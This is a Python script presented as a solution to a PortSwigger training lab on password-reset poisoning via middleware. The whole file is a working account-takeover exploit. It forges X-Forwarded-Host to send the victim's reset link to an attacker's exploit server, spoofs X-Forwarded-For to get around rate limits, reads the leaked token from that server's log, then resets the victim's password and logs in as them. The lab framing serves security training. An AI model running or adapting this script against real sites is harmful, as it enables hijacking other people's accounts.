from requests import request
from random import randint
from bs4 import BeautifulSoup
from sys import argv



def get_session(url):
    res=request(url=url,method='GET')
    cookies=""
    for key,value in res.cookies.get_dict().items():
        cookies=cookies+key+"="+value+";"
    return cookies

def generate_random_ip():
    return str(randint(0,255))+'.'+str(randint(0,255))+'.'+str(randint(0,255))+'.'+str(randint(0,255))

def poison_reset_password_url(exploit_server_url,cookies):
    exploit_server=exploit_server_url.split('://')[1].split('/')[0]
    headers={
        'Cookie':cookies,
        'X-Forwarded-For':generate_random_ip(),
        'X-Forwarded-Host':exploit_server
    }
    return headers

def send_reset_password_url(forgot_password_url,exploit_server_url,cookies,username):
    data='username='+username
    headers=poison_reset_password_url(exploit_server_url,cookies)
    print('POST '+forgot_password_url +'  '+data)
    res=request(url=forgot_password_url,method='POST',data=data,headers=headers)

def get_exploit_server_url(login_url,cookies):
    headers={
        'Cookie':cookies,
        'X-Forwarded-For':generate_random_ip()
            }
    print('GET '+login_url)
    res=request(url=login_url,method='GET',headers=headers)
    soup=BeautifulSoup(res.content.decode(),'html.parser')
    exploit_server_url=soup.find('a',{'id':'exploit-link'}).get('href')
    if exploit_server_url[-1]!='/':
        exploit_server_url=exploit_server_url +'/'
    print('[+] Found Exploit Server Link: '+exploit_server_url)
    return exploit_server_url

def get_reset_token(exploit_server_log_url):
    print('GET ' +exploit_server_log_url)
    res=request(url=exploit_server_log_url,method='GET')
    soup=BeautifulSoup(res.content.decode(),'html.parser')
    access_log=soup.find('pre',{'class':'container'}).contents[0].split('\n')
    access_log.reverse()
    for req in access_log:
        if req.count('forgot-password')>0:
            index_of_forgot_password_endpoint=req.index('forgot-password')
            password_reset_token=req[index_of_forgot_password_endpoint :-1].split(' HTTP')[0].split('temp-forgot-password-token=')[1]
            return password_reset_token


def set_new_password(reset_url,cookies,reset_token,username,new_password):
    headers={
        'Cookie':cookies,
        'X-Forwarded-For':generate_random_ip()
            }
    data='temp-forgot-password-token='+reset_token+'&username='+username+'&new-password-1='+new_password+'&new-password-2='+new_password
    print('POST '+reset_url+'  '+data)
    res=request(url=reset_url,method='POST',headers=headers,data=data)

def login(login_url,cookies,username,password):
    headers={
        'Cookie':cookies,
        'X-Forwarded-For':generate_random_ip()
    }
    data='username='+username+'&password='+password
    print('POST '+login_url+'  '+data)
    res=request(url=login_url,method='POST',headers=headers,data=data)
    soup=BeautifulSoup(res.content.decode(),'html.parser')
    soup=soup.find('div',{'id':'account-content'})
    for element in soup.contents:
        if element=="\n":
            continue
        elif element.contents[0].count('Your username')>0 or element.contents[0].count('Your email')>0  :
            print( element.contents[0])


def pwn(url,attacker_username,victim_username, new_password):
    cookies=get_session(url)
    try:
        exploit_server_url=get_exploit_server_url(url+'login',cookies)
        send_reset_password_url(url+'forgot-password',exploit_server_url,cookies,victim_username)
        reset_token=get_reset_token(exploit_server_url+'log')
        set_new_password(url+'forgot-password?temp-forgot-password-token='+reset_token,cookies,reset_token,victim_username,new_password)
        login(url+'login',cookies,victim_username,new_password)
        print("[+] Pwned Successfully : Now Username is: "+victim_username+'  New Password is: '+new_password)
    except AttributeError:
        login(url+'login',cookies,victim_username,new_password)
    except:
        print("[-] Please Provide valid parameters that required , \n [!] Note : when you provide url ,  provide just the lab url ")

if __name__ == "__main__":
 print("""
    0xCrypt00o Solution for Portswigger LAB : Password-Reset-Poisoning-Via-Middleware
        For More Solutions check :
                https://github.com/Crypt00o/Portswigger-Labs/
    """)
 if len(argv)==5:
     pwn(argv[1],argv[2],argv[3],argv[4])
 else:
     print("call it with : ./pwn-auth-password-reset-poisoning-via-middleware.py <url> <attacker username>  <victim_username> <new victim password> ")
